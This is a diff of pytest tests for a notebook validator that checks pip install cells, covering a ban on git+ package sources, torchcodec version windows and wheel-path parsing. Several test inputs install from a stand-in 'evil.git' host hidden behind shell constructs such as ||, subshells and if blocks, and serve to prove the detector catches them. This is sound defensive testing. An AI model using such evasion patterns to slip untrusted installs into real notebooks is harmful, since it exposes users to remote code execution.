@@ -884,20 +884,33 @@ def test_notebook_validator_moves_off_an_exclusive_endpoint():
         ), cell
 
 
-def test_only_the_git_ban_reads_conditional_invocations():
-    """Five of the six readers ask what the cell leaves installed and take the filtered
-    iterator. R-INST-001 asks what could run at all, so it keeps the raw one."""
+def test_every_rule_reads_the_filtered_invocations():
+    """Every reader asks what the cell leaves installed and takes the filtered iterator.
+    R-INST-001 asks what could run at all, and answers it from whole lines instead."""
     nv = _load_notebook_validator_module()
 
     cell = "!pip install foo || pip install --no-deps git+https://example.com/evil.git"
     assert [inv.packages for inv in nv.unconditional_pip_invocations(cell)] == [["foo"]]
     assert len(list(nv.iter_pip_invocations(cell))) == 2
-    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0))
+
+    # The ban reads whole lines, so no shell construct can put a git+ source out of reach.
+    for evil in (
+        cell,
+        "!pip install foo || (pip install git+https://example.com/evil.git)",
+        "!pip install foo || if command -v uv; then pip install git+https://example.com/evil.git; fi",
+    ):
+        assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(evil, "nb.ipynb", 0)), evil
+
+    # Still line-scoped: the allowlist holds, and a line with no pip command is not an install.
+    assert nv.rule_inst_001_git_plus(
+        "!pip install git+https://github.com/unslothai/unsloth-zoo.git", "nb.ipynb", 0
+    ) == []
+    assert nv.rule_inst_001_git_plus('x = "git+https://example.com/evil.git"', "nb.ipynb", 0) == []
 
     source = (REPO_ROOT / "scripts" / "notebook_validator.py").read_text(encoding = "utf-8")
     assert (
-        source.count("in iter_pip_invocations(install_cell)") == 2
-    ), "only unconditional_pip_invocations itself and R-INST-001 may read the raw iterator"
+        source.count("in iter_pip_invocations(install_cell)") == 1
+    ), "only unconditional_pip_invocations may read the raw iterator; rules take the filtered one"
 
 
 def test_notebook_validator_keeps_a_group_conditional_throughout():
@@ -927,6 +940,48 @@ def test_notebook_validator_keeps_a_group_conditional_throughout():
     # The git+ ban still sees inside the group, conditional or not.
     evil = "!pip install foo || (pip install bar && pip install git+https://example.com/evil.git)"
     assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(evil, "nb.ipynb", 0))
+
+
+def test_notebook_validator_pads_the_minor_boundary():
+    """`<0.11.0` and `<0.11` name the same boundary, so both windows hold one minor."""
+    nv = _load_notebook_validator_module()
+
+    assert nv.cmp_releases("0.11.0", "0.11") == 0
+    assert nv.cmp_releases("0.11.1", "0.11") == 1
+    assert nv._window_names_one_minor("0.10", "0.11.0")
+
+    for cell in (
+        '!pip install "torchcodec>=0.10,<0.11.0"',
+        '!pip install "torchcodec>=0.10,<0.11"',
+    ):
+        assert len(
+            nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0)
+        ) == 1, cell
+
+    assert nv.rule_inst_004_torchcodec_torch(
+        '!pip install "torchcodec>=0.10,<0.12"', COLAB_TORCH211, "nb.ipynb", 0
+    ) == []
+
+
+def test_notebook_validator_reads_an_archive_given_as_a_path():
+    """`./torchcodec-0.13.0-...whl` parses as a project called `.`, so checking parse_spec
+    first hid the wheel behind a name that never matches."""
+    nv = _load_notebook_validator_module()
+
+    for path in (
+        "./torchcodec-0.13.0-cp312-cp312-manylinux_2_28_x86_64.whl",
+        "torchcodec-0.13.0-cp312-cp312-manylinux_2_28_x86_64.whl",
+        "/tmp/torchcodec-0.13.0-cp312-cp312-manylinux_2_28_x86_64.whl",
+    ):
+        assert nv._archive_requirement(path) == ("torchcodec", "0.13.0"), path
+        assert nv.rule_inst_004_torchcodec_torch(
+            f'!pip install "torch==2.12.0" {path}', COLAB_TORCH211, "nb.ipynb", 0
+        ) == [], path
+
+    stale = "./torchcodec-0.10.0-cp312-cp312-manylinux_2_28_x86_64.whl"
+    assert len(nv.rule_inst_004_torchcodec_torch(
+        f'!pip install "torch==2.12.0" {stale}', COLAB_TORCH211, "nb.ipynb", 0
+    )) == 1
 
 
 def test_notebook_validator_reads_a_range_as_one_window():
